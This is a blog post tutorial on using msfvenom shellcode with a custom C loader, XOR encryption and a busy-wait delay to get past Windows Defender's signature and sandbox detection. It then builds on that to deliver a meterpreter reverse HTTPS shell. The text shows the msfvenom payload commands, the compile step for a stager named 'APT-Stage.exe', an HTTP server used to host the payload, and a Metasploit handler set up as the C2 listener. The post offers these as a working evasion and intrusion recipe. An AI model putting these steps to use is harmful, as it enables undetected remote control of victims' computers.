---
layout: post
title: "Msfvenom Is Not Dead"
date: 2026-01-30
categories: [my-research]
image: https://miro.medium.com/v2/resize:fit:2000/format:webp/1*wMY1oHvtqyLp2czACLuH4w.png
permalink: /blog/AV-Evations
locked: false
---

You’ve definitely run msfvenom, uploaded the payload, and watched it get nuked instantly by Windows Defender. It’s frustrating. It makes you think Msfvenom is useless or outdated.

So I was thinking about a different way to keep using msfvenom these days, and I found one. Today, I’m going to show you that the tool isn't the problem the delivery method is. By taking a 'flagged' raw payload and wrapping it in a custom C loader with simple XOR encryption, we can bypass static analysis and pop a calculator on a fully patched system.

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  {% raw %}
  <pre><code class="Terminal">
msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c
</code></pre>
  {% endraw %}
</div>

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*RgqwqTZWMz-OIvnxD_HA2w.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

Now let's create our own `loader.c`

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*DRKqSVzYxjPm5mrcRVF0CA.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

Unfortunately, antivirus vendors know it better than anyone.

When you compile this C code into an `.exe`, the compiler effectively copies and pastes your `char stager[]` directly into the `.data` section of the executable.

-   The Antivirus scans your new `.exe` file. It ignores the C syntax (`int main`, `VirtualProtect`) and looks at the raw bytes.

-   It finds the exact sequence `\xfc\xe8\x82...` sitting inside your executable. Since it already flagged that sequence earlier, it flags your new program immediately. You haven't changed the "fingerprint" — you just put it in a different container.

See the example below:

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*F_Y5WUkq5y7Ngntl2GId5w.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

## Video Demonstration

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe 
    src="https://www.youtube.com/embed/zymYUL9V4ec" 
    frameborder="0" 
    allowfullscreen 
    style="position: absolute; top:0; left: 0; width: 100%; height: 100%;">
  </iframe>
</div>

### The Solution: XOR Encryption
To evade the Static Analysis (Signature) detection, you must make sure the shellcode inside your C file does not look like shellcode until the moment it runs.

We do this by encrypting the shellcode. A simple and effective method for learning is XOR Encryption.

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*oeo6dTqaUMnBW_VK6jwKnA.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

Let's update our loader too

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*eGox0WO7kXyBLakfXUBUAQ.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*O65xRfbsH3G0Om1PRUyqTQ.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

Do you think this simple XOR encryption would bypass Windows Defender?

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe 
    src="https://www.youtube.com/embed/u-PdD4gxbas" 
    frameborder="0" 
    allowfullscreen 
    style="position: absolute; top:0; left: 0; width: 100%; height: 100%;">
  </iframe>
</div>

### Why did it get caught?

Modern AVs don't just read the file they **run it** in a fake, safe environment (a sandbox) for a few seconds to see what happens.

1.   When you downloaded/ran your executable, the AV secretly started it in a sandbox.

2.   The AV watched your program run the `for` loop. It saw the "gibberish" turn back into the dangerous `\xfc\xe8...` shellcode.

3.   Once the loop finished, the AV scanned the memory, saw the `Meterpreter` signature again, and deleted the file.

[Advanced technologies in Microsoft Defender Antivirus](https://learn.microsoft.com/en-us/defender-endpoint/adv-tech-of-mdav)

### How to Bypass the Sandbox

The AV sandbox has a weakness `time`. It cannot analyze every file for 10 minutes it usually gives up after 5–10 seconds to avoid slowing down the user's computer.

If we can make our program "do nothing" or "waste time" for longer than the AV is willing to watch, the AV will assume the file is safe, quit the sandbox, and let the real program run.

We will add a delay before the decryption happens. **However, standard `Sleep()` often doesn't work** because AVs know how to "fast forward" through a simple sleep command.

Instead, we use a 'busy wait,' making the computer do some math that actually takes time to compute.

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Yfo3x6fyxQUz298X9lWjZQ.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

Do you think this time would bypass Windows Defender?

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe 
    src="https://www.youtube.com/embed/aRQJn9B5X14" 
    frameborder="0" 
    allowfullscreen 
    style="position: absolute; top:0; left: 0; width: 100%; height: 100%;">
  </iframe>
</div>

This successfully performed a sandbox bypass.

# Reverse Shell

Now, let’s get to the real deal: getting a reverse shell, not just popping up a calculator. This time, we will not use encryption.

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*vZGONyKEOQJlA_ApeQKuLw.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

#### Step 1: Generate the Staged Payload

Let's generate the raw C code for a staged payload.

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  {% raw %}
  <pre><code class="Terminal">
msfvenom -p windows/meterpreter_reverse_https LHOST=IP LPORT=8443 -f raw > shellcode.bin

</code></pre>
  {% endraw %}
</div>

#### Step 2:

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  {% raw %}
  <pre><code class="Terminal">
i686-w64-mingw32-gcc https-downloader.c -o APT-Stage.exe -lwininet
</code></pre>
  {% endraw %}
</div>

#### Step 3: Set up the Listener (The "C2 Server")

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  {% raw %}
  <pre><code class="Terminal">
sudo python3 -m http.server 80
</code></pre>
  {% endraw %}
</div>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  {% raw %}
  <pre><code class="Terminal">
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter_reverse_https; set LHOST eth0; set LPORT 8443; run"
</code></pre>
  {% endraw %}
</div>


<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*lKwtpe4lUYhCAHGq9mzRZA.png"
  alt="Website initial view"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe 
    src="https://www.youtube.com/embed/v8enMs1Oexo" 
    frameborder="0" 
    allowfullscreen 
    style="position: absolute; top:0; left: 0; width: 100%; height: 100%;">
  </iframe>
</div>
